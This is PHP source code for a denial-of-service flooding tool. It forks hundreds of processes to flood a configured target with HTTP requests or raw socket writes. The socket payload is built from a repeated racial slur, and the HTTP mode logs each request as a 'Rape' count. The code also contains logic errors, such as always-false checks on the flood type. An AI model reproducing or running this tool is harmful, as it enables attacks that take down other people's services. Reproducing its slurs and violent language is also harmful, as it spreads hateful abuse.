<?php
function screen($text, $type = 'INFO', $die = false){
	($die ? die("$text\n") : print('[' . date('H:i:s a') . "] [$type] -> $text\n"));
}
function upCheck($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($code == 200 ? true : false);
}
define('TARGET', "http://localhost/register.php");
define('FLOOD_TYPE', strtolower('http')); //change socket to the flood type you want ;)
define('THREADING', 'ON'); //Can be 'ON' or 'OFF'
define('THREADS', (int)275);
define('OS', strtoupper(substr(PHP_OS, 1, 3)));
if(!in_array(FLOOD_TYPE, array('http', 'udp', 'tcp', 'socket'))) screen('Unrecognized flood type.', 'TYPE', true);

if(!FLOOD_TYPE == 'http'){
	$exp = explode(':', TARGET);
	if(!$exp) screen('Malformed target or error exploding target string', 'ERROR', true);
	if(!@$exp[0] || !@$exp[1]) screen('Malformed target.', 'ERROR', true);
	if(!is_numeric($exp[1])) screen('Port is not numeric.', 'ERROR', true);

	define('HOST', @$exp[0]);
	define('PORT', (int)@$exp[1]);
	unset($exp);
}

switch(FLOOD_TYPE){
	case 'socket':
		$lol = 'NIGGERS.NIGGERS.NIGGERS.NIGGERS.NIGGERS';
		$count = 1;
		$tSock = socket_create(AF_INET, SOCK_STREAM, 0) or screen('Unable to create test socket.', 'ERROR', true);
		if(!@socket_connect($tSock, HOST, PORT)) screen('Unable to connect (Test socket)', 'ERROR', true);
		@socket_close($tSock);
		screen('Initiating socket flood.');
		if(THREADING == 'ON' && !OS == 'WIN'){
			screen('Threading is ON.' . chr(10) . 'Creating threads..');
			for($i = 0; $i <= THREADS; $i++){
				$pid = pcntl_fork();
				if(!$pid == 0) break;
				pcntl_wait($status);
				screen(sprintf("Thread %s created (PID: %s)", $i, $pid));
			}
		}
		while(true){
			$sock = socket_create(AF_INET, SOCK_STREAM, 0);
			if(@socket_connect($sock, HOST, PORT)){
				$lol .= '.NIGGERS.NIGGERS';
				@socket_write($sock, $lol);
				(!OS == 'WIN') ? screen("Packet sent! (Count: $count, PID: $pid)") : screen("Packet sent! (Count: $count)");
				$count++;
			} else {
				screen('Unable to connect.');
			}
		}
	break;
	case 'http':
		upCheck(TARGET);
		screen('Initiating HTTP flood..');
		define('FILE_EXT', '.htm'); //Change if needed
		$count = 1;
		if(THREADING == 'ON' && !OS == 'WIN'){
			screen('Threading is ON.' . chr(10) . 'Creating threads..' . chr(10));
			for($i = 0; $i <= THREADS; $i++){
				$pid = pcntl_fork();
				if(!$pid == 0) break;
				pcntl_wait($status);
				screen(sprintf("Thread %s created (PID: %s)", $i, $pid));
			}
		}
		(!is_dir('FILES') ? mkdir('FILES') : 'OK');
		$bytes = '';
		$format = '';
		while(!$pid == 0){
			MakeFile:
			$randint = rand(1, 9999);
			if(!file_exists('FILES' . $randint . FILE_EXT)){
				copy(TARGET, 'FILES/' . $randint . FILE_EXT);
				if(file_exists('FILES/' . $randint . FILE_EXT)){
					$bytes += filesize('FILES/' . $randint . FILE_EXT);
					$format = number_format(($bytes/1024),2,'.','') . 'KB';
					@unlink('FILES/' . $randint . FILE_EXT);
				}
				if(THREADING == 'ON' && !OS == 'WIN'){
					screen(sprintf("Rape #%s (%s) | Total Rape: %s", $count, $pid, $format));
				} else {
					screen(sprintf("Rape #%s | Total Rape: %s", $count, $format));
				}
				$count++;
			}
			else goto MakeFile;
		}
	break;
}

function __destruct(){
	if(is_dir('FILES')){
		foreach(readdir('FILES') as $i=> $file){
			unlink($file);
		}
		rmdir('FILES');
	}
}
?>


